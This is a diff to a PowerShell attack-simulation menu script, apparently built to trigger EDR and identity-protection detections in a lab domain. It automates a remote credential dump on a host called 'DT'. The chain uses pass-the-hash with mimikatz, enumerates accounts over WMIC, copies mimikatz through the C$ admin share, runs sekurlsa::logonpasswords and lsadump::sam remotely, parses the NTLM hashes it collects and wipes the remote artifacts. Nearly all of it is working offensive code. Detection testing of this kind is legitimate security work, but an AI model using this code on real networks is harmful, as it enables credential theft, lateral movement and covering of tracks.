@@ -77,7 +77,7 @@ function Show-Menu {
     Write-Host
     Write-Host "  --- Phase 4: Pivot to DT (Falcon EDR triggers) ---" -ForegroundColor Yellow
     Write-Host "  5: PtH clark.monroe -> RDP to DT                 [PassTheHash + EDR: suspicious logon]"
-    Write-Host "  6: Dump creds on DT (run ON DT after Step 5)     [EDR: LSASS access, cred theft]"
+    Write-Host "  6: Remote dump on DT (SMB + WMIC from here)      [EDR: tool transfer, LSASS access]"
     Write-Host
     Write-Host "  --- Phase 5: Privilege Escalation + Lateral ---" -ForegroundColor Yellow
     Write-Host "  7: Kerberoast svc_runbook (via PtH context)      [Kerberoasting detection]"
@@ -590,33 +590,196 @@ public class CryptoMD4 {
 
         '6' {
             Clear-Host
-            Write-Host "[Step 6] Dump credentials on DT" -ForegroundColor Cyan
-            Write-Host "         Run these commands ON DT after RDP'ing in Step 5." -ForegroundColor Yellow
-            Write-Host "         Triggers: EDR LSASS access, credential dumping alert" -ForegroundColor Yellow
+            Write-Host "[Step 6] Remote Credential Dump on DT" -ForegroundColor Cyan
+            Write-Host "         PtH clark.monroe -> SMB copy mimikatz -> WMIC remote exec" -ForegroundColor Gray
+            Write-Host "         Triggers: EDR lateral tool transfer, LSASS access, cred theft" -ForegroundColor Yellow
             Write-Host
-            Write-Host "  Copy mimikatz to DT first:" -ForegroundColor Gray
-            Write-Host
-            Write-Host "    copy \\$(hostname)\c$\IDP_Files\Mimikatz\x64\mimikatz.exe C:\Temp\" -ForegroundColor White
-            Write-Host
-            Write-Host "  Then run on DT:" -ForegroundColor Gray
-            Write-Host
-            Write-Host '    mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"' -ForegroundColor White
-            Write-Host
-            Write-Host "  Look for:" -ForegroundColor Cyan
-            Write-Host "    User: svc_runbook" -ForegroundColor White
-            Write-Host "    Domain: $env:ENV_DOMAIN" -ForegroundColor White
-            Write-Host "    NTLM: <copy this hash>" -ForegroundColor White
-            Write-Host
-            Write-Host "  Enter the svc_runbook NTLM hash found on DT:" -ForegroundColor Yellow
-            $svcHash = Read-Host "  svc_runbook NTLM hash (or Enter to skip)"
 
-            if ($svcHash -and $svcHash.Length -eq 32) {
-                $svcHash | Out-File -FilePath $svcHashFile -Encoding ASCII
-                Write-Host "`n[+] Hash saved. Steps 7, 8, 9 will use it automatically." -ForegroundColor Green
-            } elseif ($svcHash) {
-                Write-Host "[!] Hash should be 32 hex characters." -ForegroundColor Red
-            } else {
-                Write-Host "[*] Skipped." -ForegroundColor Yellow
+            $clarkHash = Get-ClarkHash
+            if (-not $clarkHash) { break }
+
+            # Build the remote dump script that will run in PtH context
+            $remoteDumpScript = @"
+`$ErrorActionPreference = "Continue"
+`$target = "`$env:ENV_DT"
+`$idpDir = "C:\IDP_Files"
+`$localMimi = "`$idpDir\Mimikatz\x64\mimikatz.exe"
+`$remotePath = "\\`$target\C`$\Temp"
+`$remoteMimi = "`$remotePath\mimikatz.exe"
+`$remoteBat = "`$remotePath\run_dump.bat"
+`$remoteDump = "`$remotePath\cred_dump.log"
+`$localDump = "`$idpDir\dt_cred_dump.log"
+
+Write-Host ""
+Write-Host "=== Remote Credential Dump on `$target ===" -ForegroundColor Cyan
+Write-Host ""
+
+# --- Phase 1: Enumerate remote accounts ---
+Write-Host "--- 6a: Remote Account Enumeration ---" -ForegroundColor Yellow
+Write-Host ""
+Write-Host "  [*] Querying logged-on users on `$target ..." -ForegroundColor White
+try {
+    `$sessions = qwinsta /server:`$target 2>&1
+    Write-Host `$sessions
+} catch {
+    Write-Host "  [!] qwinsta failed: `$_" -ForegroundColor Red
+}
+Write-Host ""
+
+Write-Host "  [*] Listing remote shares on `$target ..." -ForegroundColor White
+net view \\`$target 2>&1 | ForEach-Object { Write-Host "  `$_" }
+Write-Host ""
+
+Write-Host "  [*] Listing local accounts on `$target ..." -ForegroundColor White
+try {
+    wmic /node:`$target useraccount where "LocalAccount=True" get Name,SID 2>&1 | ForEach-Object { Write-Host "  `$_" }
+} catch {
+    Write-Host "  [!] WMIC user enum failed" -ForegroundColor Red
+}
+Write-Host ""
+
+Write-Host "  [*] Listing services running as domain accounts ..." -ForegroundColor White
+try {
+    wmic /node:`$target service where "StartName like '%%\\%%'" get Name,StartName,State 2>&1 | ForEach-Object { Write-Host "  `$_" }
+} catch {
+    Write-Host "  [!] WMIC service enum failed" -ForegroundColor Red
+}
+Write-Host ""
+
+# --- Phase 2: Copy mimikatz to DT via admin share ---
+Write-Host "--- 6b: Lateral Tool Transfer ---" -ForegroundColor Yellow
+Write-Host ""
+Write-Host "  [*] Creating remote directory \\`$target\C`$\Temp ..." -ForegroundColor White
+New-Item -Path `$remotePath -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
+
+Write-Host "  [*] Copying mimikatz.exe to `$remoteMimi ..." -ForegroundColor White
+try {
+    Copy-Item `$localMimi `$remoteMimi -Force
+    Write-Host "  [+] Mimikatz copied to DT." -ForegroundColor Green
+} catch {
+    Write-Host "  [!] Copy failed: `$_" -ForegroundColor Red
+    Write-Host "  Press any key to close..." -ForegroundColor Gray
+    `$null = `$Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+    exit 1
+}
+
+# Create a batch file on DT that runs mimikatz and dumps output
+`$dumpBat = @"
+@echo off
+C:\Temp\mimikatz.exe "privilege::debug" "token::elevate" "log C:\Temp\cred_dump.log" "lsadump::sam" "sekurlsa::logonpasswords" "exit"
+"@
+`$dumpBat | Out-File -FilePath `$remoteBat -Encoding ASCII
+Write-Host "  [+] Dump batch file written to DT." -ForegroundColor Green
+Write-Host ""
+
+# --- Phase 3: Remote execution via WMIC ---
+Write-Host "--- 6c: Remote Execution (WMIC) ---" -ForegroundColor Yellow
+Write-Host ""
+Write-Host "  [*] Executing mimikatz remotely on `$target via WMIC ..." -ForegroundColor White
+Write-Host "  [*] This triggers: LSASS access + credential dumping on EDR-managed DT" -ForegroundColor Yellow
+Write-Host ""
+
+try {
+    wmic /node:`$target process call create "cmd.exe /c C:\Temp\run_dump.bat" 2>&1 | ForEach-Object { Write-Host "  `$_" }
+    Write-Host ""
+    Write-Host "  [*] Waiting 15 seconds for remote execution to complete ..." -ForegroundColor Gray
+    Start-Sleep -Seconds 15
+} catch {
+    Write-Host "  [!] WMIC exec failed: `$_" -ForegroundColor Red
+}
+
+# --- Phase 4: Retrieve dump and parse ---
+Write-Host "--- 6d: Retrieve + Parse Dump ---" -ForegroundColor Yellow
+Write-Host ""
+Write-Host "  [*] Copying dump file back from DT ..." -ForegroundColor White
+try {
+    Copy-Item `$remoteDump `$localDump -Force
+    Write-Host "  [+] Dump retrieved: `$localDump" -ForegroundColor Green
+} catch {
+    Write-Host "  [!] Could not retrieve dump: `$_" -ForegroundColor Red
+    Write-Host "  [*] Try increasing wait time or check if mimikatz ran on DT." -ForegroundColor Gray
+    Write-Host "  Press any key to close..." -ForegroundColor Gray
+    `$null = `$Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+    exit 1
+}
+
+# Parse for svc_runbook hash
+Write-Host ""
+Write-Host "  [*] Parsing dump for svc_runbook ..." -ForegroundColor White
+`$content = Get-Content `$localDump -Raw
+
+# Show all domain accounts found
+Write-Host ""
+Write-Host "  --- Domain accounts in dump ---" -ForegroundColor Yellow
+`$regex = [regex]"User Name\s*:\s*(\S+)[\s\S]*?NTLM\s*:\s*([0-9a-fA-F]{32})"
+`$matches2 = `$regex.Matches(`$content)
+foreach (`$m in `$matches2) {
+    `$u = `$m.Groups[1].Value
+    `$h = `$m.Groups[2].Value
+    `$highlight = if (`$u -match "svc_runbook") { "Green" } else { "White" }
+    Write-Host "    `$u : `$h" -ForegroundColor `$highlight
+}
+
+# Also try sekurlsa pattern
+`$regex2 = [regex]"(?ms)Username\s*:\s*(\S+)\s*\*\s*Domain\s*:\s*\S+\s*\*\s*NTLM\s*:\s*([0-9a-fA-F]{32})"
+`$matches3 = `$regex2.Matches(`$content)
+foreach (`$m in `$matches3) {
+    `$u = `$m.Groups[1].Value
+    `$h = `$m.Groups[2].Value
+    if (`$u -notmatch '\`$') {
+        `$highlight = if (`$u -match "svc_runbook") { "Green" } else { "Gray" }
+        Write-Host "    `$u : `$h" -ForegroundColor `$highlight
+    }
+}
+
+# Extract svc_runbook hash specifically
+if (`$content -match "svc_runbook[\s\S]*?NTLM\s*:\s*([0-9a-fA-F]{32})") {
+    `$svcHash = `$Matches[1].ToLower()
+    `$svcHash | Out-File -FilePath "`$idpDir\svc_runbook_hash.txt" -Encoding ASCII
+    Write-Host ""
+    Write-Host "  [+] svc_runbook NTLM FOUND: `$svcHash" -ForegroundColor Green
+    Write-Host "  [+] Hash saved to `$idpDir\svc_runbook_hash.txt" -ForegroundColor Green
+    Write-Host "  [+] Steps 7, 8, 9 will use it automatically." -ForegroundColor Green
+} else {
+    Write-Host ""
+    Write-Host "  [-] svc_runbook not found in dump." -ForegroundColor Yellow
+    Write-Host "  [*] svc_runbook may not be logged on DT. Try RDP'ing first (Step 5)." -ForegroundColor Gray
+    Write-Host "  [*] Or enter the hash manually below." -ForegroundColor Gray
+}
+
+# --- Cleanup remote artifacts ---
+Write-Host ""
+Write-Host "  [*] Cleaning up remote artifacts on DT ..." -ForegroundColor Gray
+Remove-Item `$remoteMimi -Force -ErrorAction SilentlyContinue
+Remove-Item `$remoteBat -Force -ErrorAction SilentlyContinue
+Remove-Item `$remoteDump -Force -ErrorAction SilentlyContinue
+Write-Host "  [+] Cleanup done." -ForegroundColor Green
+
+Write-Host ""
+Write-Host "Press any key to close..." -ForegroundColor Gray
+`$null = `$Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+"@
+            $remoteDumpScript | Out-File -FilePath "$idpDir\remote_dump_dt.ps1" -Encoding ASCII
+
+            # Batch wrapper for PtH context
+            '@powershell -ExecutionPolicy Bypass -File C:\IDP_Files\remote_dump_dt.ps1' | Out-File -FilePath "$idpDir\run_remote_dump_dt.bat" -Encoding ASCII
+
+            Write-Host "  [*] Launching PtH clark.monroe -> remote dump on DT..." -ForegroundColor White
+            Write-Host "  [*] A new window will open showing the remote dump progress." -ForegroundColor Gray
+            Write-Host
+
+            & $mimiExe "privilege::debug" "sekurlsa::pth /user:clark.monroe /domain:$env:ENV_DOMAIN /ntlm:$clarkHash /run:$idpDir\run_remote_dump_dt.bat" "exit"
+
+            Write-Host
+            Write-Host "[+] Remote dump launched in PtH context." -ForegroundColor Green
+            Write-Host "[*] Check the new window for results." -ForegroundColor Cyan
+            Write-Host "[*] If svc_runbook hash is found, it will be saved automatically." -ForegroundColor Cyan
+            Write-Host
+            Write-Host "[*] If auto-extraction fails, enter manually:" -ForegroundColor Gray
+            $manualSvc = Read-Host "  svc_runbook NTLM (or Enter to skip)"
+            if ($manualSvc -and $manualSvc.Length -eq 32) {
+                $manualSvc | Out-File -FilePath $svcHashFile -Encoding ASCII
+                Write-Host "[+] Hash saved manually." -ForegroundColor Green
             }
         }
 
